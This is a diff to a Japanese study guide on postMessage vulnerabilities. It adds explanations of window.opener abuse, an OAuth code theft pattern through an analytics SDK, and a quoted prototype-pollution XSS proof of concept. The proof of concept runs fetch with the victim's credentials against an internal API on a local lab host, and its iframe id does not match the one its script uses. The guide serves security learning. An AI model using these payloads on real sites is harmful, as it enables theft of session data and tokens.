@@ -338,9 +338,11 @@ result.message // "'"<b>\"
 
 受信側が `event.origin` だけを見て `*.trusted.com` を無条件信頼する場合、その信頼オリジン上に「攻撃者制御のパラメータを `postMessage` でエコーするリレーページ」を見つけられることが多い。手口はこうだ。
 
-- opener を持たせて被害ページをポップアップ／iframe で開く（多くの pixel / SDK は `window.opener` があるときだけリスナーを登録する）。
+- opener を持たせて被害ページをポップアップ／iframe で開く（多くの pixel / SDK は `window.opener` があるときだけリスナーを登録する）。ここで `window.opener` とは、ポップアップ側から見た「自分を開いた側のウィンドウ」への参照のこと。たとえば攻撃者ページが `window.open()` で被害ページを開くと、開かれた被害ページからは攻撃者ページが `window.opener` として見える。SDK はこの `window.opener` に対して完了通知やトークンを `postMessage` で送り返すので、そこを攻撃者が受ける、という流れになる。
 - 別の攻撃者ウィンドウを信頼オリジン上のリレー endpoint へ遷移させ、注入したいメッセージフィールド（type, token, nonce）を埋める。
-- メッセージが信頼オリジン発になるため origin-only 検証を通り、被害リスナーで特権動作を起動できる。
+- メッセージが信頼オリジン発になるため origin-only 検証を通り、被害リスナーで特権動作（状態変更、API 呼び出し、DOM 書き込み）を起動できる。
+
+実地の悪用パターンを 1 つ具体化しておく。解析 SDK（pixel / fbevents 系）が `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを消費し、メッセージ内のトークンを使ってバックエンド API を呼び、そのリクエストボディに `location.href` / `document.referrer` を含める実装がある。ここに自前のトークンを渡せば、そのトークンに紐づくリクエスト履歴の中から OAuth の `code` / `token` を読み出せてしまう。任意フィールドを `postMessage` にそのまま反射するリレーは、特権リスナーが期待する message type（`msg_type` 等）を攻撃者が偽装できるようにするため、こうした踏み台化を容易にする。
 
 ハンティングのコツ: `event.origin` だけを見るリスナーを列挙し、同一オリジンの HTML/JS endpoint で URL パラメータを `postMessage` に転送するもの（マーケプレビュー、ログインポップアップ、OAuth エラーページ）を探し、`window.open()`＋`postMessage` で両者を繋いで origin チェックを回避する。
 
@@ -404,7 +406,40 @@ setTimeout(function(){w.postMessage('text here','*');}, 2000);
 - **Stealing message sent to child by blocking the main page**: メインページを送信前にブロックし、子 iframe 内の XSS で受信前にデータを奪う。
 - **Stealing message by modifying iframe location**: X-Frame 無しのページ内の子 iframe の location を攻撃者ページに変更し、ワイルドカード送信のメッセージを横取りする。
 
-なお、`postMessage` で送られたデータが JS で実行されるシナリオでは、ページを iframe 化して prototype pollution → XSS の exploit を送り込める。HackTricks は「非常によく解説された postMessage 経由 XSS」として jlajara Part II を明示的に挙げている。
+### 7.1 prototype pollution を postMessage で送り込む
+
+`postMessage` で送られたデータが JS で実行される（あるいはオブジェクトとして深くマージされる）シナリオでは、ページを iframe 化して prototype pollution → XSS の exploit を送り込める。
+
+ここで prototype pollution（プロトタイプ汚染）とは、JavaScript のすべてのオブジェクトが継承する大元の `Object.prototype` に攻撃者が任意プロパティを書き込み、以後生成される全オブジェクトにその悪性プロパティを継承させてしまう手法のこと。攻撃者が渡すデータの中に `__proto__` というキーを紛れ込ませると、受信側が無防備にマージした際に `Object.prototype` が汚染される。汚染されたプロパティがテンプレートや DOM 生成で読み出されると、そこから XSS に化ける。
+
+HackTricks は「非常によく解説された postMessage 経由 XSS」として jlajara Part II を明示的に挙げつつ、prototype pollution を postMessage で iframe に送り込む exploit の逐語例を示している。二段送信になっている点に注目してほしい。まず `__proto__` を含むペイロードを送って `Object.prototype` を汚染し、続けて `"refresh"` を送ってアプリに再描画させ、汚染された `editedbymod.username` を DOM に反映させて `onerror` を発火させる。
+
+```html
+<html>
+  <body>
+    <iframe
+      id="idframe"
+      src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
+    <script>
+      function get_code() {
+        document
+          .getElementById("iframe_victim")
+          .contentWindow.postMessage(
+            '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
+            "*"
+          )
+        document
+          .getElementById("iframe_victim")
+          .contentWindow.postMessage(JSON.stringify("refresh"), "*")
+      }
+
+      setTimeout(get_code, 2000)
+    </script>
+  </body>
+</html>
+```
+
+`onerror` に仕込まれた `fetch('.../api/invitecodes', {credentials:'same-origin'})` は、被害者のセッション cookie 付きで内部 API を呼び、返ってきた招待コードを `alert` で読み出す。つまり prototype pollution を経由して、被害オリジンで任意 JS を実行し機微データを盗み出す完成した PoC になっている。
 
 ---
 
@@ -484,7 +519,7 @@ SCRIPT438: Object doesn't support property or method 'includes'
 js_gSD6OxivXJVJaZwXxHUQz15yz9xczqXghcBxuRO0Ieo.js (43,5)
 ```
 
-2. ユーザーが先に攻撃者サイトを訪れコンタクトフォームを送信する必要がある（`inflight` に success/error を積むため）。
+2. ユーザーが先に攻撃者サイトを訪れコンタクトフォームを送信する必要がある（`inflight` に success/error を積むため）。これは関連レポート https://hackerone.com/reports/207042 と同条件だ。
 3. Firefox で CSP を Burp の match & replace（レスポンスヘッダの `^Content-Security-Policy: .*$` 除去）で無効化すると実行できた。PoC は `setInterval` で 250ms ごとに `mktoResponse` を送り、正規メッセージより先に success を処理させるレースだった。
 
 ### 8.3 CSP を触らないフィッシング亜種
@@ -617,7 +652,7 @@ jlajara Part II が Case 2 として扱う reveal.js の postMessage 脆弱性�
 
 `config.postMessage` が有効なとき、リスナーは `event.origin` を一切検証しない。受信データが `{...}` の JSON 文字列であることだけ確認し、`data.method` が `Reveal` 上の関数名なら `Reveal[data.method].apply(Reveal, data.args)` で任意の Reveal API を任意引数で呼び出せる。つまり攻撃者は reveal.js ページを iframe / ポップアップに読み込み、`postMessage('{"method":"<任意メソッド>","args":[...]}', '*')` を送るだけでよい。
 
-### 11.2 実際の XSS 発火チェーン（報告 #691977）
+### 11.2 実際の XSS 発火チェーン（報告 #691977、報告者 @s_p_q_r）
 
 任意メソッド呼び出しから実際の XSS に化ける鍵は「`addKeyBinding` で未サニタイズの `description` を登録 → `showHelp()` がそれを `innerHTML` に連結する」二段構えだ。
 
@@ -718,7 +753,7 @@ DOM / プラグイン / イベント登録系の危険メソッドを postMessag
 | `e.origin === window.origin` | サンドボックス iframe（`srcdoc`）で両辺を `'null'` に | 被害者を誘導可 |
 
 - 検出シグナル: JS バンドルを `grep -nE "addEventListener\(['\"]message|onmessage\s*="`、Chrome DevTools の Sources → Global Listeners で `message`、コンソールで `getEventListeners(window).message`、Burp DOM Invader / PostMessage-Tracker 拡張。
-- バグバウンティでの過大主張回避: 「origin 未検証」を単体で出すと N/A / Informative クローズされやすい。攻撃者ページ→被害者が開く→sink 発火を観測する end-to-end PoC が要る。sink が `console.log` や UI 状態変更のみなら影響を過大に書かない。概算重大度は、postMessage → `eval` / `innerHTML` sink ＋ origin 検証欠如 ＋ end-to-end XSS PoC で P2 High、OAuth トークンのワイルドカード配布を実捕捉で P1–P2 とされる。
+- バグバウンティでの過大主張回避: 「origin 未検証」を単体で出すと N/A / Informative クローズされやすい。攻撃者ページ→被害者が開く→sink 発火を観測する end-to-end PoC が要る。sink が `console.log` や UI 状態変更のみなら影響を過大に書かない。トークンを漏洩できた場合も、それだけで即アカウント乗っ取り（ATO）と主張してはならない。奪ったトークンを「実際にセッションへ交換できた（そのトークンで認証済みの操作ができた）」ところまで確認してから ATO と書く。概算重大度は、postMessage → `eval` / `innerHTML` sink ＋ origin 検証欠如 ＋ end-to-end XSS PoC で P2 High、OAuth トークンのワイルドカード配布を実捕捉で P1–P2 とされる。
 
 > ### 📌 ここは自分で開いて読んでください
 > **資料**: Intigriti「Exploiting postMessage vulnerabilities」 — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities ／ PortSwigger「Controlling the web message source」 — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source ／ jorianwoltjer book「postMessage exploitation」 — https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation ／ Microsoft MSRC「postMessage’d and Compromised」 — https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised
@@ -729,6 +764,29 @@ DOM / プラグイン / イベント登録系の危険メソッドを postMessag
 > 3. jorianwoltjer book: origin バイパスの体系整理、sandbox / null-origin の実演、最新ブラウザ挙動。
 > 4. MSRC: 2025 年時点の実サービスでの postMessage 悪用事例とベンダ側の緩和動向。
 > **代替手段**: PortSwigger Web Security Academy は無料アカウントでラボを実行できる。
+
+---
+
+## 13. さらに読む — postMessage 脆弱性の実レポート集
+
+jlajara Part II は末尾で、postMessage 脆弱性を学ぶために目を通すべき実レポート集を挙げている（anquanke.com 再現記事の「hackerone 上 PostMessage 漏洞报告推荐」節・逐語）。いずれも公開済みの一次 HackerOne レポートで、本節で扱ったパターン（origin 未検証、弱い検証、frame-jumping、レース、Shopify/OAuth 系の応用）を実サービスで示している。手を動かす前後にこれらを読むと、脆弱コードから PoC・影響評価までの「型」が身につく。
+
+| レポート | 対象・概要 | URL |
+|---|---|---|
+| **#168116** | Twitter: Digits bridge に対する検証不十分（Insufficient validation on Digits bridge） | https://hackerone.com/reports/168116 |
+| **#231053** | Shopify: HTML5 structured clone algorithm を postMessage リスナーで悪用し、任意 Shopify ショップで XSS（`/:id/digital_wallets/dialog`） | https://hackerone.com/reports/231053 |
+| **#207042** | HackerOne: Marketo Forms XSS ＋ postMessage frame-jumping ＋ jQuery-JSONP で www.hackerone.com のコンタクトフォームデータを窃取 | https://hackerone.com/reports/207042 |
+| **#603764** | Upserve: `https://inventory.upserve.com/login/` の postMessage 経由 DOM XSS | https://hackerone.com/reports/603764 |
+| **#217745** | Shopify: 悪意あるアプリの「Button Objects」経由で `$shop$.myshopify.com/admin/` に XSS | https://hackerone.com/reports/217745 |
+| **#381356** | HackerOne: Marketo を使った Client-Side Race Condition。Safari の `data:` へ誘導（本節の第 10 節で一次全文を解説済み） | https://hackerone.com/reports/381356 |
+
+### 13.1 一次資料の当たり方
+
+原典 jlajara Part I / II が挙げる参考文献も併せて押さえておきたい（anquanke.com 再現記事・逐語）。
+
+- **MDN `Window.postMessage`** — API の正式仕様。`targetOrigin` の意味と、受信側で `origin` / `source` を検証すべき理由が公式ドキュメントで確認できる。
+- **Medium「JavaScript and window.postMessage」** — postMessage の入門解説記事。
+- **HackerOne hacktivity の `postmessage` 検索** — 公開済みレポートを `postmessage` で横断検索すると、本表以外の実例も継続的に集められる（https://hackerone.com/hacktivity で検索）。
 
 ---
 
@@ -804,6 +862,12 @@ DOM / プラグイン / イベント登録系の危険メソッドを postMessag
 - https://hackerone.com/reports/398054 （Marketo forms2.js の DOM XSS。一次全文を GitHub mirror から逐語取得）
 - https://hackerone.com/reports/499030 （#398054 修正の indexOf バイパス）
 - https://hackerone.com/reports/381356 （Frans Rosén: Marketo race condition。一次全文を逐語取得）
+- https://hackerone.com/reports/207042 （HackerOne: Marketo Forms XSS ＋ frame-jumping ＋ jQuery-JSONP）
+- https://hackerone.com/reports/168116 （Twitter: Insufficient validation on Digits bridge）
+- https://hackerone.com/reports/231053 （Shopify: HTML5 structured clone を突く XSS）
+- https://hackerone.com/reports/603764 （Upserve: inventory.upserve.com/login の DOM XSS）
+- https://hackerone.com/reports/217745 （Shopify: Button Objects 経由の XSS）
+- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage （MDN Window.postMessage。原典 jlajara の参考文献）
 - reveal.js `js/reveal.js` @ tag 3.9.1（GitHub `hakimel/reveal.js`。CVE-2020-8127 の脆弱ハンドラを逐語取得）
 - HackTricks「PostMessage Vulnerabilities」 https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html （GitHub raw 経由で逐語取得）
 - https://github.com/benso-io/posta ／ https://github.com/fransr/postMessage-tracker ／ https://github.com/ilmila/J2EEScan ／ https://github.com/wagiro/BurpBounty
@@ -820,5 +884,5 @@ DOM / プラグイン / イベント登録系の危険メソッドを postMessag
 <!-- self-read: https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation | egress ブロックで本文取得不能 -->
 <!-- self-read: https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised | ボット保護（403）で本文取得不能 -->
 
-<!-- sources: https://jlajara.gitlab.io/Dom_XSS_PostMessage, https://jlajara.gitlab.io/Dom_XSS_PostMessage_2, https://www.anquanke.com/post/id/219088, https://hackerone.com/reports/398054, https://hackerone.com/reports/499030, https://hackerone.com/reports/381356, https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html -->
-<!-- terms: postMessage, MessageEvent, event.origin, event.source, event.data, 同一オリジンポリシー, DOM-based XSS, sink, targetOrigin, ワイルドカードオリジン, origin検証バイパス, indexOf検証, null origin, サンドボックスiframe, X-Frame-Options, frame-ancestors, CSP, Marketo forms2.js, followUpUrl, reveal.js, CVE-2020-8127, addKeyBinding, showHelp, innerHTML, Client-Side Race Condition, getEventListeners, DOM Invader, Posta, postMessage-tracker -->
+<!-- sources: https://jlajara.gitlab.io/Dom_XSS_PostMessage, https://jlajara.gitlab.io/Dom_XSS_PostMessage_2, https://www.anquanke.com/post/id/219088, https://hackerone.com/reports/398054, https://hackerone.com/reports/499030, https://hackerone.com/reports/381356, https://hackerone.com/reports/207042, https://hackerone.com/reports/168116, https://hackerone.com/reports/231053, https://hackerone.com/reports/603764, https://hackerone.com/reports/217745, https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html, https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage -->
+<!-- terms: postMessage, MessageEvent, event.origin, event.source, event.data, 同一オリジンポリシー, DOM-based XSS, sink, targetOrigin, ワイルドカードオリジン, origin検証バイパス, indexOf検証, null origin, サンドボックスiframe, X-Frame-Options, frame-ancestors, CSP, Marketo forms2.js, followUpUrl, reveal.js, CVE-2020-8127, addKeyBinding, showHelp, innerHTML, Client-Side Race Condition, getEventListeners, DOM Invader, Posta, postMessage-tracker, prototype pollution, window.opener, FACEBOOK_IWL_BOOTSTRAP -->
